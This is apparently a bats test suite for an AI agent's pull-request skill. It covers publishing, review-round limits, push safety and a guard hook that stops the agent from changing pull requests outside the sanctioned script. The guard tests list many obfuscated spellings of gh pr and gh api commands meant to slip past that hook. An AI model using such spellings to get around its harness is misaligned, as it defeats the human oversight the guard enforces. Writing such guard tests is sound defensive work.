  [[ $output == *"the description cites #999999, which isn't an issue or pull request here"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ -z "$(gh_calls 'pr create')" ]
}

@test "every number the description cites is looked up" {
  write_draft "* #12" "* #7"
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ -n "$(gh_calls 'api repos/{owner}/{repo}/issues/12')" ]
  [ -n "$(gh_calls 'api repos/{owner}/{repo}/issues/7')" ]
}

@test "an unknown milestone refuses before anything is pushed" {
  frontmatter=$'base: main\ndraft: false\nlabels: [documentation]\nmilestone: Omega'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 1 ]
  [[ $output == *'no milestone named "Omega"'* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "a gh that is not signed in refuses" {
  reviewed
  printf '#!/usr/bin/env bash\nexit 1\n' >"$tmp/bin/gh"
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"not authenticated"* ]] || false
}

# --- create and update ------------------------------------------------

@test "a known milestone is passed on create and removed on update when the draft drops it" {
  frontmatter=$'base: main\ndraft: false\nlabels: [documentation]\nmilestone: Alpha'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 0 ]
  [[ $(gh_calls 'pr create') == *" --milestone Alpha" ]] || false
  write_draft None
  printf '7\n' >"$tmp/pr-number"
  printf '{"baseRefName":"main","isDraft":false,"labels":[{"name":"documentation"}],"milestone":{"title":"Alpha"}}\n' >"$tmp/pr-view.json"
  frontmatter=$'base: main\ndraft: false\nlabels: [documentation]'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 0 ]
  [[ $(gh_calls 'pr edit') == *" --remove-milestone" ]] || false
}

@test "an open pull request is edited rather than opened again" {
  open_pr 7 false '[{"name":"documentation"},{"name":"stale"}]'
  frontmatter=$'base: main\ndraft: false\nlabels: [documentation, enhancement]'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ -z "$(gh_calls 'pr create')" ]
  [ "$(gh_calls 'pr edit')" = "pr edit 7 --base main --title docs: add a second note --body-file $(state_dir)/pr.body.md --add-label enhancement --remove-label stale" ]
  [ "$(head -n 1 "$tmp/published-body")" = "## Summary" ]
  run grep -c -F -- "--pr 7" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "the base is corrected on an open pull request" {
  open_pr 7 false
  printf '{"baseRefName":"develop","isDraft":false,"labels":[{"name":"documentation"}],"milestone":null}\n' >"$tmp/pr-view.json"
  reviewed
  publish
  [ "$status" -eq 0 ]
  [[ $(gh_calls 'pr edit') == "pr edit 7 --base main "* ]] || false
}

@test "draft false on a draft pull request marks it ready" {
  open_pr 7 true
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ "$(gh_calls 'pr ready')" = "pr ready 7" ]
}

@test "draft true on a ready pull request turns it back into a draft" {
  open_pr 7 false
  frontmatter=$'base: main\ndraft: true\nlabels: [documentation]'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ "$(gh_calls 'pr ready')" = "pr ready 7 --undo" ]
  run grep -c -F -- "is open as a draft:" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "a matching draft state calls pr ready neither way" {
  open_pr 7 false
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ -z "$(gh_calls 'pr ready')" ]
  open_pr 7 true
  frontmatter=$'base: main\ndraft: true\nlabels: [documentation]'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ -z "$(gh_calls 'pr ready')" ]
}

@test "a new commit on the branch pushes as a fast-forward" {
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ "$(cat "$tmp/push.calls")" = "push --set-upstream origin HEAD:refs/heads/docs-second-note" ]
  rm "$tmp/push.calls"

  printf 'three\n' >>notes.txt
  git commit -q -am "docs: add a third note"
  open_pr 7 false
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ "$(cat "$tmp/push.calls")" = "push --set-upstream origin HEAD:refs/heads/docs-second-note" ]
  run grep -c "force" "$tmp/push.calls"
  [ "$output" = 0 ]
}

@test "a rewritten history is refused without --rewrite, and the planner hears" {
  reviewed
  publish
  [ "$status" -eq 0 ]
  was=$("$real_git" --git-dir="$origin" rev-parse refs/heads/docs-second-note)
  rm "$tmp/push.calls"
  git commit -q --amend -m "docs: add two notes"
  open_pr 7 false
  reviewed
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"which HEAD doesn't contain. Nothing was pushed."* ]] || false
  [ ! -e "$tmp/push.calls" ]
  [ "$("$real_git" --git-dir="$origin" rev-parse refs/heads/docs-second-note)" = "$was" ]
  run grep -c "non-fast-forward" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "with --rewrite, a rewritten history leases on the exact remote commit and says so" {
  reviewed
  publish
  [ "$status" -eq 0 ]
  was=$("$real_git" --git-dir="$origin" rev-parse refs/heads/docs-second-note)
  rm "$tmp/push.calls"
  git commit -q --amend -m "docs: add two notes"
  open_pr 7 false
  reviewed
  publish --rewrite
  [ "$status" -eq 0 ]
  [ "$(cat "$tmp/push.calls")" = "push --set-upstream --force-with-lease=refs/heads/docs-second-note:$was origin HEAD:refs/heads/docs-second-note" ]
  [ "$("$real_git" --git-dir="$origin" rev-parse refs/heads/docs-second-note)" = "$(git rev-parse HEAD)" ]
  [[ $output == *"REWRITE: docs-second-note on origin went from $was"* ]] || false
  run grep -c "rewrote docs-second-note on origin, replacing $was" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "a branch behind its remote is refused, even with --rewrite" {
  reviewed
  publish
  [ "$status" -eq 0 ]
  # Someone else adds a commit on origin, and this checkout fetches it
  # but stays behind.
  "$real_git" clone -q "$origin" "$tmp/other"
  "$real_git" -C "$tmp/other" checkout -q docs-second-note
  printf 'theirs\n' >>"$tmp/other/notes.txt"
  "$real_git" -C "$tmp/other" -c user.name=Other -c user.email=other@example.com -c commit.gpgsign=false commit -q -am "docs: add their note"
  "$real_git" -C "$tmp/other" push -q origin docs-second-note
  theirs=$("$real_git" --git-dir="$origin" rev-parse refs/heads/docs-second-note)
  rm "$tmp/push.calls"
  open_pr 7 false
  reviewed
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"Nothing was pushed"* ]] || false
  # Not yet fetched: --rewrite refuses a commit this checkout never saw.
  publish --rewrite
  [ "$status" -eq 1 ]
  [[ $output == *"a commit this checkout has never fetched"* ]] || false
  # Fetched, and HEAD merely behind it: --rewrite still refuses.
  git fetch -q origin
  publish --rewrite
  [ "$status" -eq 1 ]
  [[ $output == *"HEAD is behind origin"* ]] || false
  [ ! -e "$tmp/push.calls" ]
  [ "$("$real_git" --git-dir="$origin" rev-parse refs/heads/docs-second-note)" = "$theirs" ]
}

# --- the round bound and the report ----------------------------------

@test "past the bound, findings of any tag block, stamp nothing, and the planner hears" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [substance] The summary restates the diff."
  review
  [ "$status" -eq 2 ]
  review
  [ "$status" -eq 2 ]
  review
  [ "$status" -eq 3 ]
  [[ $output == *"BLOCKED"* ]] || false
  [ ! -e "$(state_dir)/pr.stamp" ]
  run grep -c -- "--kind blocker" "$tmp/mail.calls"
  [ "$output" = 1 ]
  run grep -c "review-bound" "$tmp/mail.calls"
  [ "$output" = 1 ]
  publish
  [ "$status" -eq 1 ]
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ ! -e "$tmp/gh.calls" ]
}

@test "the report is one line" {
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ "$(wc -l <"$tmp/mail.calls" | tr -d ' ')" = 1 ]
}

@test "a report prints when no mailbox is configured" {
  reviewed
  export AGENT_SKILLS_MAIL_CMD=
  publish
  [ "$status" -eq 0 ]
  [[ $output == *"REPORT (fixed, no mailbox configured)"* ]] || false
  [[ $output == *"#7 docs: add a second note is open and ready for review"* ]] || false
  [ ! -e "$tmp/mail.calls" ]
}

@test "a pass after findings clears the round count" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [substance] The summary restates the diff."
  review
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ ! -e "$(state_dir)/pr.rounds" ]
}

# --- the guard --------------------------------------------------------

guard() {
  run bash -c "printf '%s' \"\$1\" | $(hook_command)" _ "$(jq -n --arg c "$1" '{tool_input: {command: $c}}')"
}

# Each line is one command the guard has to refuse. Bash would run every
# one of them as a change to a pull request.
@test "the guard refuses every gh pr verb that changes a pull request, however it is spelled" {
  while IFS= read -r command; do
    guard "$command"
    [ "$status" -eq 2 ] || { echo "not refused: $command"; false; }
    [[ $output == *"Blocked by the agent-pr skill guard."* ]] || false
    [[ $output == *"agent-pr/scripts/publish.sh"* ]] || false
  done <<'EOF'
gh pr create
gh pr create --title x --body y
gh pr edit 5 --base main
gh pr ready 5
gh pr ready 5 --undo
gh pr merge 5 --squash
gh pr close 5
gh pr reopen 5
gh pr comment 5 -b hi
gh pr review 5 --approve
gh pr update-branch 5
gh -R o/r pr create
gh --repo o/r pr edit 5
gh --repo=o/r pr ready 5
gh -R o/r --hostname h pr merge 5
cd x && gh pr close 5
gh pr view 5 && gh pr create
gh pr view 5; gh pr create
gh pr view 5 | gh pr create
GH_TOKEN=x gh pr comment 5 -b hi
GH_REPO=o/r gh pr create
command gh pr create
env gh pr create
env GH_TOKEN=x gh pr create
time gh pr create
! gh pr create
sudo -u x gh pr create
/opt/homebrew/bin/gh pr create
~/bin/gh pr create
\gh pr create
"gh" pr create
gh "pr" create
gh pr "create"
gh pr cre""ate
gh p""r create
{ gh pr create; }
if true; then gh pr create; fi
x=`gh pr create`
x=$(gh pr create)
(gh pr create)
echo 5 | xargs -I{} gh pr merge {}
gh pr create>/dev/null
gh pr create 2>&1
echo hi&gh pr create
gh pr view 5 --json title pr create
gh pr view pr create
gh issue list --search pr create
eval "gh pr create"
bash -c 'gh pr create'
sh -c "gh -R o/r pr edit 5"
EOF
}

@test "the guard refuses a pull request command across a continuation and in a here-document" {
  guard "$(printf 'gh \\\n  pr create')"
  [ "$status" -eq 2 ]
  guard "$(printf 'gh pr \\\n create')"
  [ "$status" -eq 2 ]
  guard "$(printf 'gh \\\n  -R o/r \\\n  pr edit 5')"
  [ "$status" -eq 2 ]
  guard "$(printf 'bash <<EOF\ngh pr create\nEOF')"
  [ "$status" -eq 2 ]
  guard "$(printf 'cat <<A-B\nbody\nA-B\ngh pr create\nA')"
  [ "$status" -eq 2 ]
  guard "$(printf 'cat >a <<-EOF\n\tbody\n\tEOF\ngh pr ready 5')"
  [ "$status" -eq 2 ]
  guard "$(printf 'echo "<< EOF "\ngh pr create\nEOF')"
  [ "$status" -eq 2 ]
  guard "$(printf 'true # <<EOF\ngh pr create\nEOF')"
  [ "$status" -eq 2 ]
}

@test "the guard refuses a gh api call that changes a pull request, however it is spelled" {
  while IFS= read -r command; do
    guard "$command"
    [ "$status" -eq 2 ] || { echo "not refused: $command"; false; }
    [[ $output == *"Blocked by the agent-pr skill guard."* ]] || false
    [[ $output == *"agent-pr/scripts/publish.sh"* ]] || false
  done <<'EOF'
gh api repos/o/r/pulls -X POST
gh api -X POST repos/o/r/pulls
gh api repos/o/r/pulls/5 -X PATCH
gh api -X PATCH repos/o/r/pulls/5
gh api -X PUT repos/o/r/pulls/5/merge
gh api -X DELETE repos/o/r/pulls/5/requested_reviewers
gh api -XPOST repos/o/r/pulls
gh api -X=POST repos/o/r/pulls
gh api -iXPOST repos/o/r/pulls
gh api -X post repos/o/r/pulls
gh api --method POST repos/o/r/pulls
gh api --method=PATCH repos/o/r/pulls/5
gh api --method PUT repos/o/r/pulls/5/merge
gh api repos/o/r/pulls/5 -f state=closed
gh api repos/o/r/pulls/5 -fstate=closed
gh api repos/o/r/pulls/5 -F draft=false
gh api repos/o/r/pulls/5 --field state=closed
gh api repos/o/r/pulls/5 --field=state=closed
gh api repos/o/r/pulls/5 --raw-field state=closed
gh api repos/o/r/pulls/5/merge --input body.json
gh api repos/o/r/pulls/5/merge --input=body.json
gh api /repos/o/r/pulls/5 -f state=closed
gh api repos/{owner}/{repo}/pulls -f title=x
gh api -H "Accept: application/json" repos/o/r/pulls -X POST
gh api "repos/o/r/pulls?per_page=1&x=2" -X POST
gh api repos/o/r/pulls -X GET -X POST
gh -R o/r api repos/o/r/pulls -X POST
env gh api repos/o/r/pulls -X POST
/opt/homebrew/bin/gh api repos/o/r/pulls -X POST
gh api repos/o/r/pulls/5 -f state=closed && echo done
bash -c 'gh api repos/o/r/pulls -X POST'
EOF
}

@test "the guard allows reading a pull request and anything else" {
  while IFS= read -r command; do
    guard "$command"
    [ "$status" -eq 0 ] || { echo "refused: $command"; false; }
  done <<'EOF'
gh pr view 5
gh pr list
gh pr checks 5
gh pr diff
gh pr status
gh pr
gh pr --help
gh -R o/r pr view 5
gh --repo=o/r pr list --state open
gh pr view 5 --json title,body -q .title
gh pr list --head docs-second-note --state open --json number,isDraft,url
gh pr view 5 && echo done
gh pr view 5 | head
gh pr view 5; git status
gh pr checks 5 --watch
gh issue create
gh issue list
gh label list
gh auth status
gh search prs
gh api repos/x
gh api repos/o/r/pulls
gh api repos/o/r/pulls/5 --jq .title
gh api -X GET repos/o/r/pulls -f state=open
gh api --method GET repos/o/r/pulls -F per_page=1
gh api --method=GET repos/o/r/pulls --field state=open
gh api -XGET repos/o/r/pulls -f state=open
gh api -H "Accept: application/json" repos/o/r/pulls
gh api repos/{owner}/{repo}/milestones --jq '.[].title'
gh api -X POST repos/o/r/labels -f name=docs -f color=ffffff
git push origin HEAD
git log --oneline | grep pr
git log --grep=create
bash .claude/skills/agent-pr/scripts/publish.sh
bash .claude/skills/agent-pr/scripts/review.sh
mise run lint-pr-description
grep -n "<<" notes.txt
echo $((1<<3))
sed -n '/<<EOF/,/^EOF/p' notes.txt
echo high pr create
ghost pr create
gh issue list && echo pr merge
gh pr view 5; echo pr create
gh issue list & echo pr merge
gh issue list | grep pr close
EOF
  guard "$(printf 'cat >notes.md <<EOF\nA note about pulls.\nEOF')"
  [ "$status" -eq 0 ]
}

@test "the guard also refuses a command that only mentions a gh pr verb that changes a pull request" {
  # It reads text, not shell grammar, and it errs toward refusing. This
  # replaces the allowance for a quoted note and for a here-document body.
  guard 'echo "then run gh pr create"'
  [ "$status" -eq 2 ]
  [[ $output == *"only mentions a gh pr verb"* ]] || false
  guard "git log --grep='gh pr create'"
  [ "$status" -eq 2 ]
  guard "$(printf 'cat >notes.md <<EOF\ngh pr create\nEOF')"
  [ "$status" -eq 2 ]
}

@test "the guard refuses a command it can't read" {
  mkdir "$tmp/without-jq"
  for tool in cat awk tr bash; do
    ln -s "$(command -v "$tool")" "$tmp/without-jq/$tool"
  done
  run env PATH="$tmp/without-jq" /bin/bash -c "printf '%s' '{\"tool_input\":{\"command\":\"gh pr view 5\"}}' | $(hook_command)"
  [ "$status" -eq 2 ]
  [[ $output == *"needs jq"* ]] || false
  run bash -c "printf '%s' 'not json' | $(hook_command)"
  [ "$status" -eq 2 ]
  [[ $output == *"couldn't read the command"* ]] || false
  run bash -c "printf '%s' '{\"tool_input\":{}}' | $(hook_command)"
  [ "$status" -eq 0 ]
}

@test "the scripts suppress no shellcheck rule" {
  run grep -c "shellcheck disable" "$scripts"/*.sh
  [ "$status" -eq 1 ]
}

# --- preflight --------------------------------------------------------

@test "preflight prints its sections and writes nothing" {
  run bash "$scripts/preflight.sh"
  [ "$status" -eq 0 ]
  for section in "== worktree ==" "== base ==" "== commits that would land ==" "== existing pull request ==" "== draft ==" "== report =="; do
    [[ $output == *"$section"* ]] || false
  done
  [[ $output == *"branch: docs-second-note"* ]] || false
  [[ $output == *"docs: add a second note"* ]] || false
  [[ $output == *"ahead of origin/main: 1"* ]] || false
  [[ $output == *"mailbox: configured, reports go to planner"* ]] || false
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills" ]
}

@test "preflight shows an open pull request and a missing draft" {
  open_pr 7 true
  rm PR_AGENTDESC.md
  run bash "$scripts/preflight.sh"
  [ "$status" -eq 0 ]
  [[ $output == *"#7 ready for review https://example.com/widgets/pull/7"* ]] || false
  [[ $output == *"scaffold-description.sh <base>"* ]] || false
}

@test "preflight says so when there is nothing to open a pull request for" {
  git checkout -q main
  run bash "$scripts/preflight.sh"
  [ "$status" -eq 0 ]
  [[ $output == *"nothing to open a pull request for"* ]] || false
}

@test "preflight survives a failing gh and a missing mailbox" {
  : >"$tmp/gh-fail"
  run bash "$scripts/preflight.sh"
  [ "$status" -eq 0 ]
  [[ $output == *"gh unavailable"* ]] || false
  export AGENT_SKILLS_MAIL_CMD=
  run bash "$scripts/preflight.sh"
  [ "$status" -eq 0 ]
  [[ $output == *"mailbox: not configured"* ]] || false
}

@test "preflight stops on a revert in progress" {
  printf '%s\n' "$(git rev-parse HEAD)" >"$(git rev-parse --absolute-git-dir)/REVERT_HEAD"
  run bash "$scripts/preflight.sh"
  [[ $output == *"IN PROGRESS: a REVERT_HEAD"* ]] || false
}

@test "publish refuses before any write unless gh is signed in as the configured account" {
  printf 'the-owner\n' >"$tmp/login"
  reviewed
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"gh is signed in as the-owner, not agent-account; nothing was pushed"* ]] || false
  [ ! -e "$tmp/push.calls" ]
  [ -z "$(gh_calls 'pr create')" ]
  AGENT_SKILLS_GH_LOGIN="" run bash "$scripts/publish.sh"
  [ "$status" -eq 1 ]
  [[ $output == *"gh_login isn't configured"* ]] || false
  [ ! -e "$tmp/push.calls" ]
}

@test "the agent account defaults to tbhb-agent, and the repository's settings file can't change it" {
  unset AGENT_SKILLS_GH_LOGIN
  cp -R "$scripts/../../agent-commit" "$tmp/skill"
  printf 'gh_login = the-owner\n' >"$tmp/skill/agent-skills.conf"
  run bash -c ". '$tmp/skill/scripts/lib.sh'; as_conf gh_login tbhb-agent"
  [ "$output" = tbhb-agent ]
  printf 'the-owner\n' >"$tmp/login"
  reviewed
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"gh is signed in as the-owner, not tbhb-agent"* ]] || false
}
